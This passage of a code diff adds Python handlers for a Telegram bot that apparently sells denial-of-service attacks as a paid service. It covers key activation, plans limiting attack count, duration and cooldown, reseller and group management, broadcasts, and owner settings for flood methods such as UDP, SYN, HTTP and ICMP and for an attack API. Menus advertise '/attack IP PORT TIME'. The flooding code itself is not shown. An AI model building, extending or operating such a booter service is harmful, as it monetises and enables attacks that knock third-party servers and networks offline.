+{E['id']} /getid – Get your Telegram ID
+{E['key']} /activate CODE – Activate access key
+{E['user']} /user – View your plan details
+{E['video']} /video – Random attack video
+{E['help']} /help – This menu"""
+    
+    if is_group(message):
+        text += f"\n\n{E['warning']} Some commands work only in private chat."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- ACTIVATE -----
+@bot.message_handler(commands=['activate'])
+def activate_code(message):
+    user_id = message.from_user.id
+    if is_group(message):
+        bot.reply_to(message, f"{E['warning']} Please activate in private chat.")
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /activate CODE", parse_mode="HTML")
+        return
+    code = parts[1].upper()
+    if blocked_codes_col.count_documents({"_id": code}) > 0:
+        bot.reply_to(message, f"{E['cross']} Code blocked.")
+        return
+    key = keys_col.find_one({"_id": code})
+    if not key:
+        bot.reply_to(message, f"{E['cross']} Invalid code.")
+        return
+    if key.get("redeemed_by"):
+        bot.reply_to(message, f"{E['cross']} Already redeemed.")
+        return
+    expires = datetime.fromisoformat(key["expires"])
+    if datetime.now() > expires:
+        keys_col.delete_one({"_id": code})
+        bot.reply_to(message, f"{E['cross']} Code expired.")
+        return
+    plans_col.update_one({"_id": str(user_id)}, {"$set": {
+        "attacks_left": key["attacks_left"],
+        "max_duration": key["max_duration"],
+        "cooldown": key["cooldown"],
+        "expires": key["expires"],
+        "redeemed_code": code
+    }}, upsert=True)
+    keys_col.update_one({"_id": code}, {"$set": {"redeemed_by": user_id, "redeemed_at": datetime.now().isoformat()}})
+    log_key_event("redeemed", code, redeemed_by=user_id)
+    bot.reply_to(message, f"""{E['check']} <b>Code Activated!</b>
+
+{E['key']} Code: <code>{code}</code>
+{E['target']} Attacks: {'Unlimited' if key['attacks_left'] == -1 else key['attacks_left']}
+{E['clock']} Max Duration: {key['max_duration']}s
+{E['hourglass']} Cooldown: {key['cooldown']}s
+{E['calendar']} Valid until: {expires.strftime('%Y-%m-%d %H:%M:%S')}""", parse_mode="HTML")
+
+# ----- USER -----
+@bot.message_handler(commands=['user'])
+def user_info(message):
+    if not check_access(message):
+        return
+    user_id = message.from_user.id
+    
+    if is_group(message):
+        if is_approved_group(message.chat.id):
+            limits = get_group_limits(message.chat.id)
+            bot.reply_to(message, f"""{E['check']} Approved group.
+
+{E['settings']} Limits:
+Max concurrent: {limits[0]}
+Max time: {limits[1]}s
+Cooldown: {limits[2]}s
+Per-person: {limits[3]}""")
+        else:
+            bot.reply_to(message, f"{E['cross']} Group not approved.")
+        return
+
+    if is_owner(user_id):
+        bot.reply_to(message, f"{E['crown']} Owner. Unlimited access.")
+        return
+
+    plan = plans_col.find_one({"_id": str(user_id)})
+    if not plan:
+        bot.reply_to(message, f"{E['cross']} No active plan. Use /activate CODE")
+        return
+
+    expires = datetime.fromisoformat(plan["expires"])
+    now = datetime.now()
+    if now > expires:
+        bot.reply_to(message, f"{E['cross']} Plan expired.")
+        return
+
+    remaining_time = expires - now
+    days = remaining_time.days
+    hours = remaining_time.seconds // 3600
+    minutes = (remaining_time.seconds % 3600) // 60
+
+    text = f"""{E['info']} <b>Your Plan:</b>
+
+{E['target']} Attacks: {'Unlimited' if plan['attacks_left'] == -1 else plan['attacks_left']}
+{E['clock']} Max duration: {plan['max_duration']}s
+{E['hourglass']} Cooldown: {plan['cooldown']}s
+{E['calendar']} Expires in: {days}d {hours}h {minutes}m"""
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- GEN KEY -----
+@bot.message_handler(commands=['gen', 'genkey'])
+def generate_key(message):
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, f"{E['cross']} Owner only.")
+        return
+    
+    parts = message.text.split()
+    if len(parts) < 3:
+        bot.reply_to(message, f"""{E['warning']} Usage: /gen <name> <time> [max_attacks]
+
+{E['clock']} Time: 30min, 1hr, 2hr, 5hr, 12hr, 1d, 3d, 7d, 15d, 30d
+{E['target']} max_attacks: -1 for unlimited""", parse_mode="HTML")
+        return
+    
+    name = parts[1]
+    time_str = parts[2]
+    max_attacks = int(parts[3]) if len(parts) > 3 else -1
+    
+    time_delta = parse_time(time_str)
+    if not time_delta:
+        bot.reply_to(message, f"{E['cross']} Invalid time format!")
+        return
+    
+    expires = datetime.now() + time_delta
+    code = generate_code(prefix=name)
+    
+    keys_col.insert_one({
+        "_id": code,
+        "created_by": BOT_OWNER,
+        "created_at": datetime.now().isoformat(),
+        "expires": expires.isoformat(),
+        "attacks_left": max_attacks,
+        "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
+        "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
+        "redeemed_by": None,
+        "type": "normal"
+    })
+    
+    log_key_event("created", code, created_by=BOT_OWNER)
+    log_admin_action(message.from_user.id, f"Generated key {code}")
+    
+    bot.reply_to(message, f"""{E['check']} <b>Key Generated!</b>
+
+{E['key']} Code: <code>{code}</code>
+{E['user']} Name: {name}
+{E['calendar']} Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}
+{E['target']} Attacks: {'Unlimited' if max_attacks == -1 else max_attacks}
+{E['clock']} Max Duration: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
+{E['hourglass']} Cooldown: {get_setting('cooldown', DEFAULT_COOLDOWN)}s
+
+{E['rocket']} Activate: /activate {code}""", parse_mode="HTML")
+
+# ----- SET MULTIPLE ATTACK -----
+@bot.message_handler(commands=['set_multiple_attack'])
+def set_multiple_attack(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /set_multiple_attack <number>", parse_mode="HTML")
+        return
+    try:
+        num = int(parts[1])
+        if num < 1 or num > 10:
+            bot.reply_to(message, f"{E['cross']} Number must be between 1 and 10.")
+            return
+        update_setting("multiple_attack", num)
+        bot.reply_to(message, f"{E['check']} Multiple attacks set to {num}.")
+    except:
+        bot.reply_to(message, f"{E['cross']} Invalid number!")
+
+# ----- SET API METHOD -----
+@bot.message_handler(commands=['set_api_method'])
+def set_api_method(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /set_api_method <method>\n\nAvailable: UDP-BIG, UDP, TCP, HTTP, STUN, SYN, ICMP", parse_mode="HTML")
+        return
+    method = parts[1].upper()
+    valid_methods = ["UDP-BIG", "UDP", "TCP", "HTTP", "STUN", "SYN", "ICMP"]
+    if method not in valid_methods:
+        bot.reply_to(message, f"{E['cross']} Invalid method!")
+        return
+    update_setting("attack_method", method)
+    bot.reply_to(message, f"{E['check']} Method set to: {method}")
+
+# ----- SET API -----
+@bot.message_handler(commands=['setapi'])
+def set_api(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /setapi <url> <key>", parse_mode="HTML")
+        return
+    url, key = parts[1], parts[2]
+    update_setting("api_url", url)
+    update_setting("api_key", key)
+    log_admin_action(message.from_user.id, "Updated API")
+    bot.reply_to(message, f"{E['check']} API updated!")
+
+# ----- OWNER -----
+@bot.message_handler(commands=['owner'])
+def owner_command(message):
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, f"{E['cross']} Owner only.")
+        return
+    
+    text = f"""{E['crown']} <b>👑 OWNER PANEL</b> {E['sparkles']}
+
+{E['settings']} <b>Current Settings:</b>
+• Concurrent: {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}
+• Max Time: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
+• Cooldown: {get_setting('cooldown', DEFAULT_COOLDOWN)}s
+• Method: {get_setting('attack_method', DEFAULT_METHOD)}
+• Multiple Attacks: {get_setting('multiple_attack', 2)}
+• Bot Status: {'🟢 ON' if get_setting('bot_status', True) else '🔴 OFF'}
+
+{E['bolt']} ━━━━━━━ USER COMMANDS ━━━━━━━
+• /attack IP PORT TIME - Start attack
+• /status - Active attacks
+• /running - Active attacks
+• /user - Your plan info
+• /activate CODE - Activate key
+• /video - Random attack video
+• /ping - Bot latency
+• /getid - Your ID
+• /help - Help menu
+
+{E['crown']} ━━━━━━━ OWNER COMMANDS ━━━━━━━
+
+{E['key']} <b>KEY MANAGEMENT:</b>
+• /gen NAME TIME [max] - Generate key
+• /genkey NAME TIME [max] - Generate key
+• /keys - List all keys
+• /allkeys - All keys with details
+• /delkey KEY - Delete key
+• /delkeys confirm - Delete ALL keys
+• /extendkey KEY/ID TIME - Extend key/user
+• /extendallkey TIME - Extend all keys
+• /down KEY/ID TIME - Reduce time
+• /keyusers KEY - Show key users
+• /delexpkey - Delete expired keys
+
+{E['user']} <b>USER MANAGEMENT:</b>
+• /checkuser ID - Check user plan
+• /remove ID - Remove user plan
+• /remove_expired - Clean expired plans
+• /ban ID - Ban user
+• /unban ID - Unban user
+• /tban ID TIME [reason] - Temp ban
+• /banned_list - List banned users
+• /resetcooldown ID - Reset user cooldown
+• /resetuserattack ID GID - Reset attack limit
+
+{E['settings']} <b>SETTINGS:</b>
+• /settime SEC - Max attack time
+• /setcooldown SEC - Cooldown
+• /setconcurrent NUM - Max concurrent
+• /setglobalcooldown SEC - Global cooldown
+• /set_api_method METHOD - Set method
+• /set_multiple_attack NUM - Attacks per user
+• /setapi URL KEY - API settings
+• /setgrp GID SETTING VALUE - Group config
+
+{E['group']} <b>GROUP MANAGEMENT:</b>
+• /approve GID - Approve group
+• /disapprove GID - Remove group
+• /revoke GID - Revoke group
+• /groups - List approved groups
+• /approved_groups - List approved groups
+
+{E['tools']} <b>ADMIN MANAGEMENT:</b>
+• /addadmin ID - Add admin
+• /removeadmin ID - Remove admin
+• /admins - List admins
+
+{E['money']} <b>RESELLER MANAGEMENT:</b>
+• /add_reseller ID - Add reseller
+• /remove_reseller ID - Remove reseller
+
+{E['mega']} <b>BROADCAST:</b>
+• /broadcast all MSG - ALL users
+• /broadcast paid MSG - PAID users
+• /broadcast reseller MSG - RESELLERS
+• /broadcastall MSG - ALL (legacy)
+• /broadcastpaid MSG - PAID (legacy)
+• /broadcastreseller MSG - RESELLERS (legacy)
+
+{E['lock']} <b>BLOCKING:</b>
+• /addport PORT - Block port
+• /removeport PORT - Unblock port
+• /addip IP - Block IP
+• /removeip IP - Unblock IP
+
+{E['power']} <b>BOT CONTROL:</b>
+• /on - Bot ON
+• /off - Bot OFF
+• /maintenance on/off - Maintenance
+• /ok - Maintenance OFF
+• /stop - Stop ALL attacks
+
+{E['chart']} <b>STATS & INFO:</b>
+• /stats - Bot statistics
+• /state - Full statistics
+• /serverinfo - Server info
+• /server_stats - Server info
+• /myapi - API info
+
+{E['help']} <b>OTHER:</b>
+• /owner - This panel
+• /owner_panel - Full owner menu"""
+
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- OWNER PANEL FULL -----
+@bot.message_handler(commands=['owner_panel'])
+def owner_panel_full(message):
+    if not is_owner(message.from_user.id):
+        return
+    text = f"""{E['crown']} <b>👑 FULL OWNER PANEL</b> {E['sparkles']}
+
+{E['tools']} ━━━━━━━ ADMIN ━━━━━━━
+• /addadmin <id> - Add admin
+• /removeadmin <id> - Remove admin
+• /admins - List admins
+
+{E['group']} ━━━━━━━ GROUPS ━━━━━━━
+• /approve <id> - Approve group
+• /disapprove <id> - Remove group
+• /revoke <id> - Revoke group
+• /approved_groups - List groups
+• /groups - List groups
+
+{E['user']} ━━━━━━━ USERS ━━━━━━━
+• /ban <id> - Ban user
+• /unban <id> - Unban user
+• /tban <id> <time> [reason] - Temp ban
+• /banned_list - List banned
+• /users - List active users
+• /remove <id> - Remove plan
+• /remove_expired - Clean expired
+• /checkuser <id> - Check user plan
+• /resetcooldown <id> - Reset cooldown
+• /resetuserattack <id> <gid> - Reset attack limit
+
+{E['money']} ━━━━━━━ RESELLERS ━━━━━━━
+• /add_reseller <id> - Add reseller
+• /remove_reseller <id> - Remove
+• /resellers - List resellers
+
+{E['key']} ━━━━━━━ KEYS ━━━━━━━
+• /gen <name> <time> [max] - Generate key
+• /genkey <name> <time> [max] - Generate key
+• /keys - List active keys
+• /allkeys - All keys details
+• /delkey <key> - Delete key
+• /delkeys confirm - Delete all keys
+• /extendkey <key/id> <time> - Extend key
+• /extendallkey <time> - Extend all keys
+• /down <key/id> <time> - Reduce time
+• /keyusers <key> - Show key users
+• /delexpkey - Delete expired keys
+
+{E['settings']} ━━━━━━━ SETTINGS ━━━━━━━
+• /settime <sec> - Max attack time
+• /setcooldown <sec> - Cooldown
+• /setconcurrent <num> - Max concurrent
+• /setglobalcooldown <sec> - Global cooldown
+• /set_api_method <method> - Set method
+• /set_multiple_attack <num> - Attacks per user
+• /setapi <url> <key> - API settings
+• /setgrp <gid> <setting> <val> - Group config
+
+{E['chart']} ━━━━━━━ STATS ━━━━━━━
+• /stats - Bot statistics
+• /state - Full statistics
+• /serverinfo - Server info
+• /server_stats - Server info
+• /myapi - API info
+• /broadcast all <msg> - ALL users
+• /broadcast paid <msg> - PAID users
+• /broadcast reseller <msg> - RESELLERS
+• /broadcastall <msg> - ALL (legacy)
+• /broadcastpaid <msg> - PAID (legacy)
+• /broadcastreseller <msg> - RESELLERS (legacy)
+
+{E['bolt']} ━━━━━━━ ATTACK ━━━━━━━
+• /attack <ip> <port> <time> - Launch
+• /status - Active attacks
+• /running - Active attacks
+• /ping - Bot status
+• /getid - Get IDs
+
+{E['power']} ━━━━━━━ BOT CONTROL ━━━━━━━
+• /on - Bot ON
+• /off - Bot OFF
+• /maintenance on/off - Maintenance
+• /ok - Maintenance OFF
+• /stop - Stop ALL attacks
+
+{E['lock']} ━━━━━━━ BLOCKING ━━━━━━━
+• /addport <port> - Block port
+• /removeport <port> - Unblock port
+• /addip <ip> - Block IP
+• /removeip <ip> - Unblock IP"""
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- SETTINGS -----
+@bot.message_handler(commands=['settime'])
+def set_max_time(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /settime <seconds>", parse_mode="HTML")
+        return
+    try:
+        t = int(parts[1])
+        if t < 10 or t > 600:
+            bot.reply_to(message, f"{E['cross']} Time must be 10-600s!")
+            return
+        update_setting("max_attack_time", t)
+        plans_col.update_many({}, {"$set": {"max_duration": t}})
+        bot.reply_to(message, f"{E['check']} Max time set to {t}s.")
+    except:
+        bot.reply_to(message, f"{E['cross']} Invalid number!")
+
+@bot.message_handler(commands=['setcooldown'])
+def set_cooldown(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /setcooldown <seconds>", parse_mode="HTML")
+        return
+    try:
+        c = int(parts[1])
+        if c < 0 or c > 600:
+            bot.reply_to(message, f"{E['cross']} Cooldown must be 0-600s!")
+            return
+        update_setting("cooldown", c)
+        plans_col.update_many({}, {"$set": {"cooldown": c}})
+        bot.reply_to(message, f"{E['check']} Cooldown set to {c}s.")
+    except:
+        bot.reply_to(message, f"{E['cross']} Invalid number!")
+
+@bot.message_handler(commands=['setconcurrent'])
+def set_concurrent(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /setconcurrent <number>", parse_mode="HTML")
+        return
+    try:
+        num = int(parts[1])
+        if num < 1 or num > 50:
+            bot.reply_to(message, f"{E['cross']} Number must be 1-50!")
+            return
+        update_setting("max_concurrent_attacks", num)
+        bot.reply_to(message, f"{E['check']} Concurrent set to {num}.")
+    except:
+        bot.reply_to(message, f"{E['cross']} Invalid number!")
+
+# ----- ON/OFF -----
+@bot.message_handler(commands=['on'])
+def bot_on(message):
+    if not is_admin(message.from_user.id):
+        return
+    update_setting("bot_status", True)
+    bot.reply_to(message, f"{E['check']} Bot ONLINE.")
+
+@bot.message_handler(commands=['off'])
+def bot_off(message):
+    if not is_admin(message.from_user.id):
+        return
+    update_setting("bot_status", False)
+    bot.reply_to(message, f"{E['cross']} Bot OFFLINE.")
+
+# ----- MAINTENANCE -----
+@bot.message_handler(commands=['maintenance'])
+def maintenance_toggle(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
+        bot.reply_to(message, f"{E['warning']} Usage: /maintenance on/off", parse_mode="HTML")
+        return
+    state = parts[1].lower() == 'on'
+    update_setting("maintenance_mode", state)
+    bot.reply_to(message, f"{E['tools']} Maintenance: {'ON' if state else 'OFF'}")
+
+# ----- APPROVE/DISAPPROVE -----
+@bot.message_handler(commands=['approve'])
+def approve_group(message):
+    if not is_owner(message.from_user.id):
+        return
+    if is_group(message):
+        chat_id = str(message.chat.id)
+    else:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, f"{E['warning']} Usage: /approve <group_id>", parse_mode="HTML")
+            return
+        chat_id = parts[1]
+    
+    if not is_approved_group(chat_id):
+        groups_col.insert_one({"_id": str(chat_id)})
+        limits_col.update_one({"_id": str(chat_id)}, {"$set": {
+            "max_concurrent": 1,
+            "max_time": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
+            "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
+            "per_person_limit": 1
+        }}, upsert=True)
+        bot.reply_to(message, f"{E['check']} Group {chat_id} Approved!")
+    else:
+        bot.reply_to(message, f"{E['warning']} Already approved!")
+
+@bot.message_handler(commands=['disapprove', 'revoke'])
+def disapprove_group(message):
+    if not is_owner(message.from_user.id):
+        return
+    if is_group(message):
+        chat_id = str(message.chat.id)
+    else:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, f"{E['warning']} Usage: /disapprove <group_id>", parse_mode="HTML")
+            return
+        chat_id = parts[1]
+    
+    groups_col.delete_one({"_id": str(chat_id)})
+    limits_col.delete_one({"_id": str(chat_id)})
+    bot.reply_to(message, f"{E['cross']} Group {chat_id} Disapproved!")
+
+# ----- BAN/UNBAN -----
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /ban <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    bans_col.insert_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['lock']} User {user_id} banned.")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /unban <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    bans_col.delete_one({"_id": str(user_id)})
+    temp_bans_col.delete_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['unlock']} User {user_id} unbanned.")
+
+# ----- TEMP BAN -----
+@bot.message_handler(commands=['tban'])
+def temp_ban_user(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) < 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /tban <user_id> <time> [reason]", parse_mode="HTML")
+        return
+    
+    user_id = parts[1]
+    time_str = parts[2]
+    reason = " ".join(parts[3:]) if len(parts) > 3 else "No reason"
+    
+    time_delta = parse_time(time_str)
+    if not time_delta:
+        bot.reply_to(message, f"{E['cross']} Invalid time format!")
+        return
+    
+    expires = datetime.now() + time_delta
+    
+    temp_bans_col.insert_one({
+        "_id": str(user_id),
+        "expires": expires.isoformat(),
+        "reason": reason,
+        "banned_by": message.from_user.id
+    })
+    
+    bot.reply_to(message, f"{E['lock']} User {user_id} temp banned until {expires.strftime('%Y-%m-%d %H:%M:%S')}\nReason: {reason}")
+
+# ----- STATS -----
+@bot.message_handler(commands=['stats', 'state'])
+def stats_command(message):
+    if not is_admin(message.from_user.id):
+        return
+    approved = groups_col.count_documents({})
+    banned = bans_col.count_documents({})
+    active_plans = plans_col.count_documents({})
+    total_attacks = attack_logs_col.count_documents({})
+    completed_attacks = attack_logs_col.count_documents({"status": "completed"})
+    total_keys = keys_col.count_documents({})
+    resellers = resellers_col.count_documents({})
+    known_users = known_users_col.count_documents({})
+    active_attacks_count = get_active_attack_count()
+
+    text = f"""{E['chart']} <b>Statistics</b>
+
+{E['group']} Approved Groups: {approved}
+{E['lock']} Banned Users: {banned}
+{E['user']} Active Plans: {active_plans}
+{E['key']} Total Keys: {total_keys}
+{E['money']} Resellers: {resellers}
+{E['user']} Known Users: {known_users}
+{E['bolt']} Total Attacks: {total_attacks}
+{E['check']} Completed: {completed_attacks}
+{E['zap']} Active Attacks: {active_attacks_count}
+{E['settings']} Max Concurrent: {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}
+{E['clock']} Max Time: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
+{E['settings']} Method: {get_setting('attack_method', DEFAULT_METHOD)}
+{E['zap']} Multiple Attacks: {get_setting('multiple_attack', 2)}
+{E['status']} Bot Status: {'🟢 ON' if get_setting('bot_status', True) else '🔴 OFF'}"""
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- SERVER INFO -----
+@bot.message_handler(commands=['serverinfo', 'server_stats'])
+def server_info(message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    cpu = psutil.cpu_percent()
+    memory = psutil.virtual_memory()
+    disk = psutil.disk_usage('/')
+    
+    text = f"""{E['server']} <b>Server Info</b>
+
+{E['settings']} CPU: {cpu}%
+{E['database']} RAM: {memory.percent}% ({memory.used // (1024**3)}GB / {memory.total // (1024**3)}GB)
+{E['database']} Disk: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)
+{E['server']} System: {platform.system()} {platform.release()}
+{E['clock']} Uptime: {str(timedelta(seconds=int(time.time() - psutil.boot_time())))}"""
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- BROADCAST -----
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split(maxsplit=2)
+    if len(parts) < 3:
+        bot.reply_to(message, f"{E['warning']} Usage: /broadcast all <message>", parse_mode="HTML")
+        return
+    
+    target = parts[1].lower()
+    msg = html.escape(parts[2])
+    
+    count = 0
+    if target == "all":
+        users = known_users_col.find()
+    elif target == "paid":
+        users = plans_col.find()
+    elif target == "reseller":
+        users = resellers_col.find()
+    else:
+        bot.reply_to(message, f"{E['cross']} Invalid target!")
+        return
+    
+    for user in users:
+        try:
+            bot.send_message(int(user["_id"]), f"{E['mega']} <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
+            count += 1
+            time.sleep(0.5)
+        except:
+            pass
+    
+    bot.reply_to(message, f"{E['check']} Sent to {count} {target} users.")
+
+# ----- BROADCAST ALL (legacy) -----
+@bot.message_handler(commands=['broadcastall'])
+def broadcast_all(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /broadcastall <message>", parse_mode="HTML")
+        return
+    msg = html.escape(parts[1])
+    users = known_users_col.find()
+    count = 0
+    for user in users:
+        try:
+            bot.send_message(int(user["_id"]), f"{E['mega']} <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
+            count += 1
+            time.sleep(0.5)
+        except:
+            pass
+    bot.reply_to(message, f"{E['check']} Sent to {count} users.")
+
+# ----- BROADCAST PAID -----
+@bot.message_handler(commands=['broadcastpaid'])
+def broadcast_paid(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /broadcastpaid <message>", parse_mode="HTML")
+        return
+    msg = html.escape(parts[1])
+    users = plans_col.find()
+    count = 0
+    for user in users:
+        try:
+            bot.send_message(int(user["_id"]), f"{E['mega']} <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
+            count += 1
+            time.sleep(0.5)
+        except:
+            pass
+    bot.reply_to(message, f"{E['check']} Sent to {count} paid users.")
+
+# ----- BROADCAST RESELLER -----
+@bot.message_handler(commands=['broadcastreseller'])
+def broadcast_reseller(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /broadcastreseller <message>", parse_mode="HTML")
+        return
+    msg = html.escape(parts[1])
+    users = resellers_col.find()
+    count = 0
+    for user in users:
+        try:
+            bot.send_message(int(user["_id"]), f"{E['mega']} <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
+            count += 1
+            time.sleep(0.5)
+        except:
+            pass
+    bot.reply_to(message, f"{E['check']} Sent to {count} resellers.")
+
+# ----- ADD RESELLER -----
+@bot.message_handler(commands=['add_reseller'])
+def add_reseller(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /add_reseller <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    resellers_col.insert_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['check']} User {user_id} added as reseller.")
+
+# ----- REMOVE RESELLER -----
+@bot.message_handler(commands=['remove_reseller'])
+def remove_reseller(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /remove_reseller <user_id>", parse_mode="HTML")
+        return
+    user_id = parts[1]
+    resellers_col.delete_one({"_id": str(user_id)})
+    bot.reply_to(message, f"{E['cross']} User {user_id} removed as reseller.")
+
+# ----- DELETE EXPIRED KEYS -----
+@bot.message_handler(commands=['delexpkey'])
+def delete_expired_keys(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    all_keys = keys_col.find()
+    count = 0
+    
+    for key in all_keys:
+        expires = datetime.fromisoformat(key["expires"])
+        if datetime.now() > expires:
+            keys_col.delete_one({"_id": key["_id"]})
+            count += 1
+    
+    bot.reply_to(message, f"{E['check']} Deleted {count} expired keys.")
+
+# ----- KEYS LIST -----
+@bot.message_handler(commands=['keys', 'allkeys'])
+def list_keys(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    all_keys = keys_col.find()
+    text = f"{E['key']} <b>All Keys:</b>\n\n"
+    count = 0
+    
+    for key in all_keys:
+        expires = datetime.fromisoformat(key["expires"])
+        remaining = expires - datetime.now()
+        days = remaining.days
+        hours = remaining.seconds // 3600
+        
+        status = "🟢 Active" if remaining.total_seconds() > 0 else "🔴 Expired"
+        redeemed = "✅ Redeemed" if key.get("redeemed_by") else "❌ Not redeemed"
+        
+        text += f"<code>{key['_id']}</code>\n"
+        text += f"  • Expires: {expires.strftime('%Y-%m-%d %H:%M')} ({days}d {hours}h left)\n"
+        text += f"  • Status: {status} | {redeemed}\n"
+        text += f"  • Attacks: {key.get('attacks_left', -1)}\n\n"
+        count += 1
+        
+        if count > 10:
+            text += f"\n{E['info']} Showing first 10 keys. Total: {keys_col.count_documents({})}"
+            break
+    
+    if count == 0:
+        text += "No keys found."
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- DELETE KEY -----
+@bot.message_handler(commands=['delkey'])
+def delete_key(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /delkey <key>", parse_mode="HTML")
+        return
+    
+    key = parts[1].upper()
+    result = keys_col.delete_one({"_id": key})
+    
+    if result.deleted_count > 0:
+        bot.reply_to(message, f"{E['check']} Key {key} deleted.")
+    else:
+        bot.reply_to(message, f"{E['cross']} Key not found.")
+
+# ----- DELETE ALL KEYS -----
+@bot.message_handler(commands=['delkeys'])
+def delete_all_keys(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2 or parts[1].lower() != 'confirm':
+        bot.reply_to(message, f"{E['warning']} Usage: /delkeys confirm", parse_mode="HTML")
+        return
+    
+    count = keys_col.count_documents({})
+    keys_col.delete_many({})
+    bot.reply_to(message, f"{E['cross']} Deleted all {count} keys.")
+
+# ----- CHECK USER -----
+@bot.message_handler(commands=['checkuser'])
+def check_user(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /checkuser <user_id>", parse_mode="HTML")
+        return
+    
+    user_id = parts[1]
+    plan = plans_col.find_one({"_id": str(user_id)})
+    
+    if not plan:
+        bot.reply_to(message, f"{E['cross']} User {user_id} has no active plan.")
+        return
+    
+    expires = datetime.fromisoformat(plan["expires"])
+    remaining = expires - datetime.now()
+    days = remaining.days
+    hours = remaining.seconds // 3600
+    
+    text = f"""{E['info']} <b>User Plan:</b>
+
+{E['user']} ID: {user_id}
+{E['target']} Attacks: {'Unlimited' if plan['attacks_left'] == -1 else plan['attacks_left']}
+{E['clock']} Max Duration: {plan['max_duration']}s
+{E['hourglass']} Cooldown: {plan['cooldown']}s
+{E['calendar']} Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}
+{E['calendar']} Time Left: {days}d {hours}h"""
+    
+    bot.reply_to(message, text, parse_mode="HTML")
+
+# ----- RESET COOLDOWN -----
+@bot.message_handler(commands=['resetcooldown'])
+def reset_cooldown(message):
+    if not is_owner(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, f"{E['warning']} Usage: /resetcooldown <user_id>", parse_mode="HTML")
+        return
+    
+    user_id = parts[1]
